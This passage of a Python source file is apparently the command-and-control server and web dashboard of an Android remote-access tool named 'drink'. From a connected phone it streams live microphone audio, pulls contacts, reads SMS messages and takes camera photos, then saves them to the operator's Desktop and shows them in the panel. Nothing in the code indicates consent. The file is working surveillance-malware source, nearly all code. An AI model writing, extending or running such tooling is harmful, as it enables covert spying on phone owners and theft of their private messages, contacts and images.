async function startMic() {
  await api('/api/client/mic/start', { method: 'POST' });
  refreshStatus();
}

async function stopMic() {
  await api('/api/client/mic/stop', { method: 'POST' });
  refreshStatus();
}

async function listCameras() {
  const res = await api('/api/client/cameras', { method: 'POST' });
  if (res && res.data) {
    renderCamPills(res.data);
  }
}

function renderCamPills(cams) {
  const box = document.getElementById('camPillsBox');
  box.innerHTML = '';
  if (!cams || cams.length === 0) {
    cams = ['0', '1'];
  }
  cams.forEach(cam => {
    const pill = document.createElement('button');
    pill.className = 'cam-pill' + (cam === selectedCamId ? ' active' : '');
    pill.textContent = 'Cam ' + cam;
    pill.onclick = () => {
      selectedCamId = cam;
      renderCamPills(cams);
    };
    box.appendChild(pill);
  });
}

async function captureSelectedCamera() {
  const res = await api('/api/client/camera/capture', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ cam_id: selectedCamId })
  });
  if (res && res.status === 'ok') {
    const img = document.getElementById('camPreviewImg');
    const empty = document.getElementById('camPreviewEmpty');
    img.src = '/api/photo/latest?t=' + Date.now();
    img.style.display = 'block';
    empty.style.display = 'none';
  }
}

function openPhotoModal() {
  const img = document.getElementById('camPreviewImg');
  if (img.style.display !== 'none' && img.src) {
    document.getElementById('photoModalImg').src = img.src;
    document.getElementById('photoModalBackdrop').style.display = 'flex';
  }
}

function closePhotoModal() {
  document.getElementById('photoModalBackdrop').style.display = 'none';
}

async function pullContacts() {
  const res = await api('/api/client/contacts', { method: 'POST' });
  loadContactsList();
}

async function loadContactsList() {
  const res = await api('/api/contacts/list');
  if (res && res.contacts) {
    allContacts = res.contacts;
    document.getElementById('valContactsCount').textContent = allContacts.length;
    document.getElementById('modalContactsCount').textContent = allContacts.length;
    if (allContacts.length > 0) {
      document.getElementById('btnDlZipCard').style.display = 'inline-flex';
      document.getElementById('btnModalDlZip').style.display = 'inline-flex';
    }
    filterContacts();
  }
}

function openContactsModal() {
  document.getElementById('contactsModalBackdrop').style.display = 'flex';
  loadContactsList();
}

function closeContactsModal() {
  document.getElementById('contactsModalBackdrop').style.display = 'none';
}

function filterContacts() {
  const q = (document.getElementById('contactsSearchInput').value || '').toLowerCase().trim();
  const grid = document.getElementById('modalContactsGrid');
  grid.innerHTML = '';

  const filtered = allContacts.filter(c => {
    const name = (c.name || '').toLowerCase();
    const phone = (c.phone || '').toLowerCase();
    return name.includes(q) || phone.includes(q);
  });

  document.getElementById('modalContactsCount').textContent = filtered.length;

  if (filtered.length === 0) {
    grid.innerHTML = '<div style="grid-column: 1/-1; text-align: center; color: #86868b; padding: 40px;">No contacts found</div>';
    return;
  }

  filtered.forEach(c => {
    const card = document.createElement('div');
    card.className = 'contact-card';
    const name = c.name || 'Unnamed';
    const phone = c.phone || 'No phone';
    const initial = name.charAt(0).toUpperCase() || '?';
    card.innerHTML = `
      <div class="contact-avatar">${initial}</div>
      <div class="contact-info">
        <div class="contact-name">${name}</div>
        <a href="tel:${phone}" class="contact-phone">${phone}</a>
      </div>
      <button class="btn-secondary" style="padding: 4px 8px; font-size: 0.72rem;" onclick="copyText('${phone}')">Copy</button>
    `;
    grid.appendChild(card);
  });
}

function copyText(txt) {
  navigator.clipboard.writeText(txt);
}

async function getSms(hours) {
  const res = await api('/api/client/sms', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ hours: parseInt(hours) || 24 })
  });
  if (res && res.data) {
    allMessages = res.data;
    renderCardSms(allMessages);
    filterMessages();
  }
}

async function getSmsFromCard() {
  const h = document.getElementById('cardSmsHours').value || 24;
  await getSms(h);
}

async function getSmsFromModal() {
  const h = document.getElementById('modalSmsHours').value || 24;
  await getSms(h);
}

function renderCardSms(messages) {
  const box = document.getElementById('cardSmsList');
  if (!messages || messages.length === 0) {
    box.innerHTML = '<span style="font-size: 0.72rem; color: #86868b; padding: 4px;">No messages</span>';
    return;
  }
  box.innerHTML = '';
  messages.slice(0, 3).forEach(m => {
    const dir = m.type === 1 ? '▼ In' : '▲ Out';
    const dStr = m.date ? new Date(m.date).toLocaleDateString() : '';
    const item = document.createElement('div');
    item.className = 'sms-preview-item';
    item.innerHTML = `
      <div class="sms-preview-meta">
        <span><strong>${dir}</strong> ${m.address || '?'}</span>
        <span>${dStr}</span>
      </div>
      <div class="sms-preview-body">${m.body || ''}</div>
    `;
    box.appendChild(item);
  });
}

function openSmsModal() {
  document.getElementById('smsModalBackdrop').style.display = 'flex';
  filterMessages();
}

function closeSmsModal() {
  document.getElementById('smsModalBackdrop').style.display = 'none';
}

function setDirFilter(dir) {
  currentDirFilter = dir;
  document.getElementById('pillDirAll').className = 'filter-pill' + (dir === 'all' ? ' active' : '');
  document.getElementById('pillDirIn').className = 'filter-pill' + (dir === 'in' ? ' active' : '');
  document.getElementById('pillDirOut').className = 'filter-pill' + (dir === 'out' ? ' active' : '');
  filterMessages();
}

function clearSmsDateFilter() {
  document.getElementById('smsDatePicker').value = '';
  filterMessages();
}

function filterMessages() {
  const q = (document.getElementById('smsSearchInput').value || '').toLowerCase().trim();
  const dateVal = document.getElementById('smsDatePicker').value;
  const stack = document.getElementById('modalMessagesStack');
  stack.innerHTML = '';

  const filtered = allMessages.filter(m => {
    if (currentDirFilter === 'in' && m.type !== 1) return false;
    if (currentDirFilter === 'out' && m.type === 1) return false;

    if (q) {
      const addr = (m.address || '').toLowerCase();
      const body = (m.body || '').toLowerCase();
      if (!addr.includes(q) && !body.includes(q)) return false;
    }

    if (dateVal && m.date) {
      const msgDate = new Date(m.date).toISOString().slice(0, 10);
      if (msgDate !== dateVal) return false;
    }

    return true;
  });

  document.getElementById('modalSmsCount').textContent = filtered.length;

  if (filtered.length === 0) {
    stack.innerHTML = '<div style="text-align: center; color: #86868b; padding: 40px;">No messages matching criteria</div>';
    return;
  }

  filtered.forEach(m => {
    const card = document.createElement('div');
    card.className = 'msg-bubble-card';
    const isReceived = m.type === 1;
    const dirTag = isReceived ? '<span class="msg-dir-tag msg-dir-in">▼ Received</span>' : '<span class="msg-dir-tag msg-dir-out">▲ Sent</span>';
    const dStr = m.date ? new Date(m.date).toLocaleString() : '';
    card.innerHTML = `
      <div class="msg-meta-row">
        <div style="display: flex; align-items: center; gap: 8px;">
          ${dirTag}
          <strong>${m.address || '?'}</strong>
        </div>
        <span style="color: #86868b;">${dStr}</span>
      </div>
      <div class="msg-text-content">${m.body || ''}</div>
    `;
    stack.appendChild(card);
  });
}

async function refreshStatus() {
  const s = await api('/api/status');
  if (!s) return;

  const pTcp = document.getElementById('pillTcp');
  const tTcp = document.getElementById('txtTcp');
  const btnStart = document.getElementById('btnStart');
  if (s.listening) {
    pTcp.className = 'pill pill-on';
    tTcp.textContent = 'TCP: Listening';
    btnStart.className = 'circle-btn circle-start active';
    document.getElementById('valListenState').textContent = 'Active listening';
  } else {
    pTcp.className = 'pill';
    tTcp.textContent = 'TCP: Stopped';
    btnStart.className = 'circle-btn circle-start';
    document.getElementById('valListenState').textContent = 'Stopped';
  }

  const pClient = document.getElementById('pillClient');
  const tClient = document.getElementById('txtClient');
  if (s.client_connected) {
    pClient.className = 'pill pill-on';
    tClient.textContent = 'Client: Connected';
    document.getElementById('valClientAddr').textContent = s.client_addr || 'Connected';
    document.getElementById('valClientStatus').textContent = 'Online';
  } else {
    pClient.className = 'pill';
    tClient.textContent = 'Client: Disconnected';
    document.getElementById('valClientAddr').textContent = 'Disconnected';
    document.getElementById('valClientStatus').textContent = s.listening ? 'Waiting for connection…' : 'Server stopped';
  }

  const pMic = document.getElementById('pillMic');
  const tMic = document.getElementById('txtMic');
  if (s.mic_active) {
    pMic.className = 'pill pill-warn';
    tMic.textContent = 'Mic: Streaming';
    document.getElementById('valMicStatus').textContent = 'Streaming live';
  } else {
    pMic.className = 'pill';
    tMic.textContent = 'Mic: Off';
    document.getElementById('valMicStatus').textContent = 'Inactive';
  }

  if (s.cameras && s.cameras.length > 0) {
    renderCamPills(s.cameras);
  }

  if (s.contacts_count !== undefined) {
    document.getElementById('valContactsCount').textContent = s.contacts_count;
  }
}

async function refreshLogs() {
  const lines = await api('/api/logs');
  if (lines) {
    const consoleBox = document.getElementById('logConsole');
    consoleBox.textContent = lines.join('\\n');
    consoleBox.scrollTop = consoleBox.scrollHeight;
  }
}

function clearLogs() {
  document.getElementById('logConsole').textContent = '';
}

renderCamPills(['0', '1']);
setInterval(refreshStatus, 1500);
setInterval(refreshLogs, 2000);
refreshStatus();
refreshLogs();
loadContactsList();
</script>
</body>
</html>"""


@app.get("/", response_class=HTMLResponse)
async def index():
    return HTML_ADMIN_PAGE


@app.get("/mic", response_class=HTMLResponse)
async def mic_page():
    return HTML_MIC_PAGE


@app.websocket("/ws/audio")
async def ws_audio(websocket: WebSocket):
    await websocket.accept()
    audio_clients.add(websocket)
    try:
        while True:
            await websocket.receive_bytes()
    except WebSocketDisconnect:
        pass
    finally:
        audio_clients.discard(websocket)


async def broadcast_audio(chunk: bytes):
    dead = set()
    for ws in audio_clients:
        try:
            await ws.send_bytes(chunk)
        except Exception:
            dead.add(ws)
    audio_clients.difference_update(dead)


async def send_frame(writer: asyncio.StreamWriter, payload: bytes):
    header = struct.pack(">I", len(payload))
    writer.write(header + payload)
    await writer.drain()


async def recv_frame(reader: asyncio.StreamReader) -> bytes:
    raw_len = await reader.readexactly(4)
    length = struct.unpack(">I", raw_len)[0]
    return await reader.readexactly(length)


async def send_command(cmd: dict):
    writer = state["client_writer"]
    if writer is None:
        print("no client connected")
        return
    await send_frame(writer, json.dumps(cmd).encode())


def client_connected() -> bool:
    return state["client_writer"] is not None


def clear_client():
    state["client_reader"] = None
    state["client_writer"] = None
    state["client_addr"] = None
    state["mic_active"] = False


async def handle_mic_stream(reader: asyncio.StreamReader):
    state["mic_active"] = True
    log_event("mic stream started — open http://localhost:3000/mic to listen")
    print("\n[mic] streaming started — open http://localhost:3000/mic to listen")
    print("drink> ", end="", flush=True)
    try:
        while state["mic_active"] and state["client_writer"] is not None:
            try:
                header_bytes = await asyncio.wait_for(recv_frame(reader), timeout=5.0)
            except asyncio.TimeoutError:
                continue
            header = json.loads(header_bytes.decode())
            if header.get("type") != "mic_chunk":
                break
            audio_data = await recv_frame(reader)
            await broadcast_audio(audio_data)
    except (asyncio.IncompleteReadError, ConnectionResetError):
        pass
    except Exception as e:
        log_event(f"mic stream error: {e}")
    finally:
        state["mic_active"] = False
        log_event("mic stream ended")
        print("\n[mic] stream ended")
        print("drink> ", end="", flush=True)


async def handle_contacts(reader: asyncio.StreamReader) -> Optional[str]:
    try:
        header_bytes = await asyncio.wait_for(recv_frame(reader), timeout=15.0)
        header = json.loads(header_bytes.decode())
        if header.get("type") == "error":
            msg = header.get("message", "unknown error")
            log_event(f"contacts error from client: {msg}")
            print(f"[contacts] error from client: {msg}")
            return None
        if header.get("type") != "contacts":
            log_event(f"contacts unexpected response: {header.get('type')}")
            print(f"[contacts] unexpected response type: {header.get('type')}")
            return None
        data = await recv_frame(reader)
        dest = Path.home() / "Desktop" / "contacts.zip"
        dest.parent.mkdir(parents=True, exist_ok=True)
        dest.write_bytes(data)
        state["latest_contacts"] = dest
        state["latest_contacts_bytes"] = data
        try:
            zf = zipfile.ZipFile(io.BytesIO(data))
            with zf.open("contacts.json") as f:
                state["contacts_list"] = json.loads(f.read().decode("utf-8"))
        except Exception:
            pass
        log_event(f"contacts saved {len(data)} bytes to {dest}")
        print(f"[contacts] saved {len(data)} bytes → {dest}")
        return str(dest)
    except Exception as e:
        log_event(f"contacts error: {e}")
        print(f"[contacts] error: {e}")
        return None


async def handle_sms(reader: asyncio.StreamReader, requested_hours: int):
    try:
        header_bytes = await asyncio.wait_for(recv_frame(reader), timeout=15.0)
        header = json.loads(header_bytes.decode())
        if header.get("type") == "error":
            msg = header.get("message", "unknown error")
            log_event(f"sms error from client: {msg}")
            print(f"[sms] error from client: {msg}")
            return []
        if header.get("type") != "sms":
            log_event(f"sms unexpected response: {header.get('type')}")
            print(f"[sms] unexpected response type: {header.get('type')}")
            return []
        messages = header.get("data", [])
        actual_hours = header.get("hours", requested_hours)
        state["latest_sms"] = messages
        log_event(f"sms received {len(messages)} messages (last {actual_hours}h)")
        print(f"\n[sms] {len(messages)} messages (last {actual_hours}h):")
        for msg in messages:
            addr = msg.get("address", "?")
            body = msg.get("body", "")
            ts = msg.get("date", "")
            direction = "▼" if msg.get("type") == 1 else "▲"
            print(f"  {direction} [{ts}] {addr}: {body}")
        if not messages:
            print("  (none)")
        return messages
    except Exception as e:
        log_event(f"sms error: {e}")
        print(f"[sms] error: {e}")
        return []


async def handle_list_cams(reader: asyncio.StreamReader):
    try:
        header_bytes = await asyncio.wait_for(recv_frame(reader), timeout=10.0)
        header = json.loads(header_bytes.decode())
        if header.get("type") == "error":
            msg = header.get("message", "unknown error")
            log_event(f"camera list error: {msg}")
            print(f"[cameras] error from client: {msg}")
            return []
        if header.get("type") != "cams":
            log_event(f"cameras unexpected response: {header.get('type')}")
            print(f"[cameras] unexpected response: {header.get('type')}")
            return []
        cams = header.get("data", [])
        state["cameras"] = cams
        log_event(f"detected cameras: {cams}")
        for cam in cams:
            print(cam)
        return cams
    except Exception as e:
        log_event(f"camera list error: {e}")
        print(f"[cameras] error: {e}")
        return []


async def handle_camera_capture(reader: asyncio.StreamReader, cam_id: str):
    try:
        header_bytes = await asyncio.wait_for(recv_frame(reader), timeout=15.0)
        header = json.loads(header_bytes.decode())
        if header.get("type") == "error":
            msg = header.get("message", "unknown error")
            log_event(f"camera {cam_id} error: {msg}")
            print(f"[cam {cam_id}] error from client: {msg}")
            return None
        if header.get("type") != "camera_capture":
            log_event(f"camera unexpected response: {header.get('type')}")
            print(f"[cam {cam_id}] unexpected response: {header.get('type')}")
            return None
        data = await recv_frame(reader)
        ts = int(time.time())
        dest = Path.home() / "Desktop" / f"cam_{cam_id}_{ts}.jpg"
        dest.parent.mkdir(parents=True, exist_ok=True)
        dest.write_bytes(data)
        state["latest_photo"] = dest
        state["latest_photo_bytes"] = data
        log_event(f"camera {cam_id} captured {len(data)} bytes saved to {dest}")
        print(f"[cam {cam_id}] saved {len(data)} bytes → {dest}")
        return str(dest)
    except Exception as e:
        log_event(f"camera capture error: {e}")
        print(f"[cam {cam_id}] error: {e}")
        return None


async def client_session(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
    addr = writer.get_extra_info("peername")
    state["client_reader"] = reader
    state["client_writer"] = writer
    state["client_addr"] = addr
    log_event(f"client connected from {addr}")
    print(f"\n[+] client connected from {addr}")
    print("drink> ", end="", flush=True)
    try:
        await asyncio.Event().wait()
    except Exception:
        pass


async def tcp_client_handler(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
    if client_connected():
        writer.close()
        await writer.wait_closed()
        return
    await client_session(reader, writer)


async def start_tcp_server_action():
    if state["listening"]:
        print("already listening")
        return {"status": "already_listening"}
    server = await asyncio.start_server(tcp_client_handler, TCP_HOST, TCP_PORT)
    state["tcp_server"] = server
    state["listening"] = True
    log_event(f"TCP server listening on {TCP_HOST}:{TCP_PORT}")
    print(f"[*] listening on {TCP_HOST}:{TCP_PORT}")
    return {"status": "started", "host": TCP_HOST, "port": TCP_PORT}


async def stop_tcp_server_action():
    if not state["listening"]:
        print("not listening")
        return {"status": "not_listening"}
    server = state["tcp_server"]
    if server:
        server.close()
        await server.wait_closed()
        state["tcp_server"] = None
        state["listening"] = False
    if state["client_writer"]:
        try:
            state["client_writer"].close()
            await state["client_writer"].wait_closed()
        except Exception:
            pass
        clear_client()
    log_event("TCP server stopped")
    print("[*] TCP server stopped")
    return {"status": "stopped"}


async def cmd_disconnect():
    if not client_connected():
        print("no client connected")
        return {"status": "no_client"}
    await send_command({"cmd": "disconnect"})
    if state["client_writer"]:
        try:
            state["client_writer"].close()
            await state["client_writer"].wait_closed()
        except Exception:
            pass
    clear_client()
    log_event("client disconnected")
    print("[*] client disconnected")
    return {"status": "disconnected"}


async def cmd_use_mic():
    if not client_connected():
        print("no client connected")
        return {"status": "no_client"}
    if state["mic_active"]:
        print("mic already active")
        return {"status": "already_active"}
    await send_command({"cmd": "use_mic"})
    reader = state["client_reader"]
    loop.create_task(handle_mic_stream(reader))
    return {"status": "started"}


async def cmd_get_contacts():
    if not client_connected():
        print("no client connected")
        return {"status": "no_client"}
    await send_command({"cmd": "get_contacts"})
    reader = state["client_reader"]
    dest = await handle_contacts(reader)
    return {"status": "ok" if dest else "failed", "path": dest}


async def cmd_get_sms(hours: int = 24):
    if not client_connected():
        print("no client connected")
        return {"status": "no_client", "data": []}
    await send_command({"cmd": "get_sms", "hours": hours})
    reader = state["client_reader"]
    messages = await handle_sms(reader, hours)
    return {"status": "ok", "data": messages}


async def cmd_list_cams():
    if not client_connected():
        print("no client connected")
        return {"status": "no_client", "data": []}
    await send_command({"cmd": "list_cams"})
    reader = state["client_reader"]
    cams = await handle_list_cams(reader)
    return {"status": "ok", "data": cams}


async def cmd_use_cam(cam_id: str):
    if not client_connected():
        print("no client connected")
        return {"status": "no_client", "path": None}
    await send_command({"cmd": "use_cam", "cam_id": str(cam_id)})
    reader = state["client_reader"]
    dest = await handle_camera_capture(reader, str(cam_id))
    return {"status": "ok" if dest else "failed", "path": dest}


@app.get("/api/status")
async def api_status():
    return {
        "listening": state["listening"],
        "client_connected": client_connected(),
        "client_addr": f"{state['client_addr'][0]}:{state['client_addr'][1]}" if state["client_addr"] else None,
        "mic_active": state["mic_active"],
        "tcp_host": TCP_HOST,
        "tcp_port": TCP_PORT,
        "cameras": state["cameras"],
        "has_photo": state["latest_photo_bytes"] is not None,
        "has_contacts": state["latest_contacts_bytes"] is not None,
        "sms_count": len(state["latest_sms"]),
        "contacts_count": len(state["contacts_list"]),
    }


@app.get("/api/logs")
async def api_logs():
    return list(logs)


@app.post("/api/server/start")
async def api_server_start():
    fut = asyncio.run_coroutine_threadsafe(start_tcp_server_action(), loop)
    res = await asyncio.wrap_future(fut)
    return res


@app.post("/api/server/stop")
async def api_server_stop():
    fut = asyncio.run_coroutine_threadsafe(stop_tcp_server_action(), loop)
    res = await asyncio.wrap_future(fut)
    return res


@app.post("/api/server/kill")
async def api_server_kill():
    def kill_soon():
        time.sleep(0.5)
        os._exit(0)
    threading.Thread(target=kill_soon, daemon=True).start()
    return {"status": "killing"}


@app.post("/api/client/disconnect")
async def api_client_disconnect():
    fut = asyncio.run_coroutine_threadsafe(cmd_disconnect(), loop)
    res = await asyncio.wrap_future(fut)
    return res


@app.post("/api/client/mic/start")
async def api_mic_start():
    fut = asyncio.run_coroutine_threadsafe(cmd_use_mic(), loop)
    res = await asyncio.wrap_future(fut)
    return res


@app.post("/api/client/mic/stop")
async def api_mic_stop():
    state["mic_active"] = False
    return {"status": "stopped"}


@app.post("/api/client/contacts")
async def api_client_contacts():
    fut = asyncio.run_coroutine_threadsafe(cmd_get_contacts(), loop)
    res = await asyncio.wrap_future(fut)
    return res


@app.post("/api/client/sms")
async def api_client_sms(payload: dict = None):
    hours = 24
    if payload and "hours" in payload:
        try:
            hours = int(payload["hours"])
        except Exception:
            hours = 24
    fut = asyncio.run_coroutine_threadsafe(cmd_get_sms(hours), loop)
    res = await asyncio.wrap_future(fut)
    return res


@app.get("/api/sms/latest")
async def api_sms_latest():
    return state["latest_sms"]


@app.post("/api/client/cameras")
async def api_client_cameras():
    fut = asyncio.run_coroutine_threadsafe(cmd_list_cams(), loop)
    res = await asyncio.wrap_future(fut)
    return res


@app.post("/api/client/camera/capture")
async def api_client_camera_capture(payload: dict = None):
    cam_id = "0"
    if payload and "cam_id" in payload:
        cam_id = str(payload["cam_id"])
    fut = asyncio.run_coroutine_threadsafe(cmd_use_cam(cam_id), loop)
    res = await asyncio.wrap_future(fut)
    return res


@app.get("/api/photo/latest")
async def api_photo_latest():
    if state["latest_photo_bytes"]:
        return Response(content=state["latest_photo_bytes"], media_type="image/jpeg")
    return Response(content=b"", status_code=404)


@app.get("/api/contacts/download")
async def api_contacts_download():
    if state["latest_contacts_bytes"]:
        return Response(
            content=state["latest_contacts_bytes"],
            media_type="application/zip",
            headers={"Content-Disposition": "attachment; filename=contacts.zip"},
        )
    return Response(content=b"", status_code=404)


@app.get("/api/contacts/list")
async def api_contacts_list():
    if state["contacts_list"]:
        return {"status": "ok", "count": len(state["contacts_list"]), "contacts": state["contacts_list"]}
    if state["latest_contacts_bytes"]:
        try:
            zf = zipfile.ZipFile(io.BytesIO(state["latest_contacts_bytes"]))
            with zf.open("contacts.json") as f:
                data = json.loads(f.read().decode("utf-8"))
                state["contacts_list"] = data
                return {"status": "ok", "count": len(data), "contacts": data}
        except Exception as e:
            return {"status": "error", "message": str(e), "contacts": []}
    dest = Path.home() / "Desktop" / "contacts.zip"
    if dest.exists():
        try:
            with zipfile.ZipFile(dest) as zf:
                with zf.open("contacts.json") as f:
                    data = json.loads(f.read().decode("utf-8"))
                    state["contacts_list"] = data
                    return {"status": "ok", "count": len(data), "contacts": data}
        except Exception as e:
            return {"status": "error", "message": str(e), "contacts": []}
    return {"status": "none", "count": 0, "contacts": []}


def print_help(post_start: bool = False, post_connect: bool = False):
    if not post_start:
        print("  start            start listening for TCP connections")
        print("  quit             exit")
        return
    if not post_connect:
        print("  stop             stop listening")
        print("  quit             exit")
        print("  (waiting for client…)")
        return
    print("  disconnect       disconnect the Android client")
    print("  use mic          start mic audio stream")
    print("  get contacts     download contacts.zip to Desktop")
    print("  get sms [hours]  fetch SMS messages (default 24h)")
    print("  list             list available cameras")
    print("  use cam <id>     capture photo from camera (e.g. use cam 0)")
    print("  stop             stop server and disconnect client")
    print("  quit             exit")
    print("  help             show this help")


async def shell_loop():
    executor_loop = asyncio.get_event_loop()

    def read_line():
        sys.stdout.write("drink> ")
        sys.stdout.flush()
        return sys.stdin.readline()

    while True:
        line = await executor_loop.run_in_executor(None, read_line)
        line = line.strip()
        if not line:
            continue

        cmd = line.lstrip("/").strip()

        if cmd in ("quit", "exit"):
            print("bye.")
            os._exit(0)

        if cmd == "start":
            if state["listening"]:
                print("already listening")
            else:
                executor_loop.create_task(start_tcp_server_action())
            continue

        if cmd == "stop":
            if not state["listening"]:
                print("not listening")
            else:
                await stop_tcp_server_action()
            continue

        if cmd == "disconnect":
            await cmd_disconnect()
            continue

        if cmd == "use mic":
            await cmd_use_mic()
            continue

        if cmd == "get contacts":
            await cmd_get_contacts()
            continue

        if cmd == "get sms" or cmd.startswith("get sms "):
            parts = cmd.split()
            hours = 24
            if len(parts) >= 3 and parts[2].isdigit():
                hours = int(parts[2])
            await cmd_get_sms(hours)
            continue

        if cmd == "list" or cmd == "list cams" or cmd == "list cameras":
            await cmd_list_cams()
            continue

        if cmd.startswith("use cam"):
            parts = cmd.split()
            cam_id = parts[2] if len(parts) >= 3 else "0"
            await cmd_use_cam(cam_id)
            continue

        if cmd == "help":
            print_help(state["listening"], client_connected())
            continue

        print(f"unknown command: {line!r}  (type help)")


def start_uvicorn():
    config = uvicorn.Config(app, host="0.0.0.0", port=WEB_PORT, log_level="warning")
    server = uvicorn.Server(config)
    server.run()


async def main():
    global loop
    loop = asyncio.get_event_loop()

    web_thread = threading.Thread(target=start_uvicorn, daemon=True)
    web_thread.start()

    print(f"drink server — web UI at http://localhost:{WEB_PORT}")
    print("type help for commands")

    await shell_loop()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nbye.")
